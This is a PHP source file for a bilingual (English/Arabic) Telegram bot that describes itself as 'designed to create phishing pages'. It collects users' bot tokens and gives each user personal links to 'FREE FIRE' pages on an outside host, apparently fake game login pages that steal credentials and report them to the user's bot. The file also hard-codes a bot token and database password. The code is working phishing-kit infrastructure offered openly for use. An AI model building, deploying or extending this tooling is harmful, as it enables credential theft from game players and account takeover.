<?php
$botToken = '5983936163:AAFi6MEWzaa0PcJ-MvHf-GmRVazh0ShUhc4'; // Main bot token
$apiUrl = "https://api.telegram.org/bot$botToken/";
// Database connection
$servername = "localhost"; 
$username = "winfun_gws"; 
$password = "winfun_gws"; 
$dbname = "winfun_gws"; 

$conn = new mysqli($servername, $username, $password, $dbname);
if ($conn->connect_error) {
    die("Connection failed: " . $conn->connect_error);
}

// Function to get user's language preference
function getUserLang($chat_id) {
    global $conn;
    $stmt = $conn->prepare("SELECT language FROM users WHERE chat_id = ?");
    $stmt->bind_param("i", $chat_id);
    $stmt->execute();
    $stmt->bind_result($language);
    $stmt->fetch();
    $stmt->close();
    return $language ?: 'en'; // Default to English if not found
}

// Function to send a message
function sendMessage($chat_id, $message, $keyboard = null) {
    global $apiUrl;
    $url = $apiUrl . "sendMessage?chat_id=$chat_id&text=" . urlencode($message);
    if ($keyboard) {
        $encodedKeyboard = json_encode($keyboard);
        $url .= "&reply_markup=" . urlencode($encodedKeyboard);
    }
    file_get_contents($url);
}

// Function to check channel membership
function isUserInChannel($chat_id, $channelUsername) {
    global $botToken;
    $url = "https://api.telegram.org/bot$botToken/getChatMember?chat_id=$channelUsername&user_id=$chat_id";
    $response = file_get_contents($url);
    return json_decode($response, true);
}

// Handling incoming updates from Telegram
$update = json_decode(file_get_contents('php://input'), TRUE);

if (isset($update['message'])) {
    $chat_id = $update['message']['chat']['id'];
    $username = $update['message']['chat']['username'] ?? ''; 
    $full_name = $update['message']['chat']['first_name'] . ' ' . ($update['message']['chat']['last_name'] ?? ''); 
    $message = $update['message']['text'];

    // Step 1: Language Selection and Channel Join Prompt
if ($message == '/start') {
    $channelUsername = 'GWS_GUYS'; // Replace with your channel's username
    $joinMessage = "🔔 - لإستخدام البوت يجب عليك الاشتراك في القنوات الخاصه بنا ⚡
    - To use the bot, you must subscribe to our channel ⚡
    - @IIIIIHJGFDGC_bot ";
    
    // Create a keyboard with a Verify button
    $keyboard = [
        'keyboard' => [
            [['text' => '✅ Verify']]
        ],
        'resize_keyboard' => true,
        'one_time_keyboard' => true
    ];

    // Send the join message with inline button for channel redirection
    sendMessage($chat_id, $joinMessage, $keyboard);
}


    // Step 2: Handle "Verify" Button Press
    if ($message == '✅ Verify') {
        $channelUsername = '@IIIIIHJGFDGC_bot'; // Replace with your actual channel username
        $chatMember = isUserInChannel($chat_id, $channelUsername);

        // Check for errors in the API response
        if (!$chatMember || $chatMember['ok'] == false) {
            sendMessage($chat_id, "🔔 - لإستخدام البوت يجب عليك الاشتراك في القنوات الخاصه بنا ⚡
            - To use the bot, you must subscribe to our channel ⚡
            - @IIIIIHJGFDGC_bot");
        } else {
            // Check if user is a member, admin, or creator of the channel
            $status = $chatMember['result']['status'];
            if (in_array($status, ['member', 'administrator', 'creator'])) {
                // User is a member, allow access
                $reply = "✅ Please select a language / الرجاء تحديد لغة";
                $keyboard = [
                    'keyboard' => [
                        [['text' => '🇬🇧 English'], ['text' => '🇸🇦 Arabic']]
                    ],
                    'resize_keyboard' => true,
                    'one_time_keyboard' => true
                ];
                sendMessage($chat_id, $reply, $keyboard);
            } else {
                // User is not a member, show error message
                $reply = "🔔 - لإستخدام البوت يجب عليك الاشتراك في القنوات الخاصه بنا ⚡
                - To use the bot, you must subscribe to our channel ⚡
                - @IIIIIHJGFDGC_bot";
                sendMessage($chat_id, $reply);
            }
        }
    }

    // Step 2: Handle Language Selection
    if ($message == '🇬🇧 English' || $message == '🇸🇦 Arabic') {
        $lang = ($message == '🇬🇧 English') ? 'en' : 'ar';

        $stmt = $conn->prepare("INSERT INTO users (chat_id, username, full_name, language) VALUES (?, ?, ?, ?) ON DUPLICATE KEY UPDATE language = VALUES(language), username = VALUES(username), full_name = VALUES(full_name)");
        $stmt->bind_param("isss", $chat_id, $username, $full_name, $lang);
        $stmt->execute();
        $stmt->close();

        $reply = ($lang == 'en') 
    ? "- Welcome👋🏻
- This bot is designed to create phishing pages ⚡️
- Click the Create button to create your links 🛠
- If you want to delete your data, Click Delete 🗑"
    : "- مرحباً👋🏻
- هذا البوت مصمم لإنشاء صفحات التصيد ⚡️
- انقر فوق الزر 'إنشاء' لإنشاء الروابط الخاصة بك 🛠
- إذا كنت تريد حذف بياناتك، اضغط على حذف 🗑";

        $keyboard = [
            'keyboard' => [
                [['text' => '🆕 Create'], ['text' => '🗑️ Delete'], ['text' => 'ℹ️ My Info']]
            ],
            'resize_keyboard' => true,
            'one_time_keyboard' => true
        ];

        sendMessage($chat_id, $reply, $keyboard);
    }

    // Step 3: Handle Create Request or Bot Token Input
if ($message == '🆕 Create' || $message == 'إنشاء') {
    $userLang = getUserLang($chat_id);  // Get user's preferred language
    $responseMessage = ($userLang === 'en') ? "- Create a bot From @BotFather and send The BotToken 🔐" : "- أنشئ روبوتًا من @BotFather وأرسل رمز الروبوت 🔐";
    sendMessage($chat_id, $responseMessage);

} elseif (preg_match('/^\d{9,10}:[A-Za-z0-9_-]{35}$/', $message)) {
    $bot_token = trim($message);  // Get the bot token entered by the user
    $userLang = getUserLang($chat_id);  // Fetch user language again for the response

    // Validate the bot token by making a request to Telegram API
    $apiUrlTokenCheck = "https://api.telegram.org/bot" . $bot_token . "/getMe";
    $response = file_get_contents($apiUrlTokenCheck);
    $result = json_decode($response, true);

    // Check if the token is valid
    if ($result && $result['ok'] === true) {
        // Insert user data into the database, including the bot token
        $stmt = $conn->prepare("INSERT INTO users (chat_id, username, full_name, language, bot_token) VALUES (?, ?, ?, ?, ?) ON DUPLICATE KEY UPDATE bot_token = VALUES(bot_token)");
        $stmt->bind_param("issss", $chat_id, $username, $full_name, $userLang, $bot_token);
        $stmt->execute();
        $stmt->close();

        // Check if chat_id is already in the gws_users.txt file
        $chatIdsFile = 'gws_users.txt'; // Path to the file
        $chatIds = file($chatIdsFile, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES); // Read the file into an array

        // Add chat_id to the file only if it doesn't already exist
        if (!in_array($chat_id, $chatIds)) {
            // Open file in append mode
            $fileHandle = fopen($chatIdsFile, 'a');
            fwrite($fileHandle, $chat_id . PHP_EOL); // Append the chat_id with a newline
            fclose($fileHandle);
        }

        // Send success message
        $responseMessage =  "- Successful operation 💥
 - Your Links :
 
- FREE FIRE 🔥🌏
V1- https://aatefsam.serv00.net/F/D1/?gws=$chat_id\n
V2- https://aatefsam.serv00.net/F/D2/?gws=$chat_id\n
V3- https://aatefsam.serv00.net/F/D3/?gws=$chat_id";
        sendMessage($chat_id, $responseMessage);

    } else {
        // Token validation failed
        $responseMessage = ($userLang === 'en') ? "- Create a bot From @BotFather and send The BotToken 🔐" : "- أنشئ روبوتًا من @BotFather وأرسل رمز الروبوت 🔐";
        sendMessage($chat_id, $responseMessage);
    }
}

    // Step 4: Handle Delete Request
if ($message == '🗑️ Delete' || $message == 'حذف') {
    $userLang = getUserLang($chat_id);
    $confirmMessage = ($userLang == 'en') ? "❓ Are you sure you want to delete your data?" : "❓ هل أنت متأكد أنك تريد حذف بياناتك؟";

    // Create a keyboard with Yes/No options
    $keyboard = [
        'keyboard' => [
            [['text' => '✔️ Yes'], ['text' => '❌ No']]
        ],
        'resize_keyboard' => true,
        'one_time_keyboard' => true
    ];

    // Send the confirmation message with the keyboard options
    sendMessage($chat_id, $confirmMessage, $keyboard);
}

// Step 5: Handle Confirmation of Data Deletion
if ($message == '✔️ Yes' || $message == '❌ No') {
    $userLang = getUserLang($chat_id);
    $responseMessage = '';  // Initialize response message variable

    if ($message == '✔️ Yes') {
        // Read all chat IDs from the text file
        $filePath = 'gws_users.txt';
        $chatIds = file($filePath, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);

        // Check if the user's chat ID exists in the file
        if (in_array($chat_id, $chatIds)) {
            // Remove the user's chat ID
            $updatedChatIds = array_filter($chatIds, function($id) use ($chat_id) {
                return $id != $chat_id;
            });

            // Save the updated chat IDs back into the text file
            file_put_contents($filePath, implode(PHP_EOL, $updatedChatIds) . PHP_EOL);

            // Set the success message
            $responseMessage = ($userLang == 'en') ? "✅ Your Data Has been deleted Successfully" : "✅ لقد تم حذف بياناتك بنجاح";
        } else {
            // Chat ID not found in the text file
            $responseMessage = ($userLang == 'en') ? "⚠️ Data not found" : "⚠️ لم يتم العثور على البيانات";
        }
    } else {
        // User canceled the deletion
        $responseMessage = ($userLang == 'en') ? "❌ Data deletion canceled." : "❌ تم إلغاء حذف البيانات.";
    }

    // Create the main menu keyboard
    $mainMenuKeyboard = [
        'keyboard' => [
            [['text' => '🆕 Create'], ['text' => '🗑️ Delete'], ['text' => 'ℹ️ My Info']]
        ],
        'resize_keyboard' => true,
        'one_time_keyboard' => false
    ];

    // Send the response message along with the main menu keyboard in a single message
    sendMessage($chat_id, $responseMessage, $mainMenuKeyboard);
}



    // Step 6: Handle User Info Request
if ($message == 'ℹ️ My Info' || $message == 'معلوماتي') {
    // Fetch user language preference
    $userLang = getUserLang($chat_id);

    // Read the text file with chat IDs
    $chatIdsFile = 'gws_users.txt'; // Your text file with chat IDs
    $chatIds = file($chatIdsFile, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES); // Load chat IDs into an array

    // Check if the user's chat_id exists in the text file
    if (in_array($chat_id, $chatIds)) {
        // Query to get user info
        $stmt = $conn->prepare("SELECT username, full_name, language, bot_token FROM users WHERE chat_id = ?");
        $stmt->bind_param("i", $chat_id);
        $stmt->execute();
        $stmt->bind_result($username, $full_name, $language, $bot_token);
        $stmt->fetch();
        $stmt->close();

        // Prepare user info message based on user language
        $infoMessage = "- Successful operation 💥
 - Your Links :
 
- FREE FIRE 🔥🌏
V1- https://aatefsam.serv00.net/F/D1/?gws=$chat_id\n
V2- https://aatefsam.serv00.net/F/D2/?gws=$chat_id\n
V3- https://aatefsam.serv00.net/F/D3/?gws=$chat_id";
        // Send the user info message
        sendMessage($chat_id, $infoMessage);
    } else {
        // Chat ID not found in the text file, send an error message
        $errorMessage = ($userLang == 'en') 
            ? "Your Data Not Found"
            : "لم يتم العثور على بياناتك";

        sendMessage($chat_id, $errorMessage);
    }
}

}
$conn->close();
?>